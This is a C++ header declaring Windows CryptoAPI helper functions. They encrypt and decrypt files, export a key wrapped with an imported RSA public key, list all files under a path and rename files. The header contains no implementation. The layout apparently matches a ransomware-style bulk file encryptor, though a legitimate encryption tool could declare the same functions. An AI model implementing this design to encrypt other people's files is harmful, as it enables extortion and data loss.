#pragma once
#include <iostream>
#include <string>
#include <vector>

void ErrorExit(LPTSTR lpszFunction);

int encrypt_file(std::string &filename, HCRYPTKEY &hKey);

int decrypt_file(std::string &filename, HCRYPTKEY &hKey);

int export_key(std::string path, HCRYPTKEY &h_key, HCRYPTKEY &pubKey);

void findAllFilesInPath(std::vector<std::string>  &list, std::string path);

BOOL importRSAKey(HCRYPTPROV &hProv, HCRYPTKEY &pubKey);

void renameFiles(std::vector<std::string> filePath);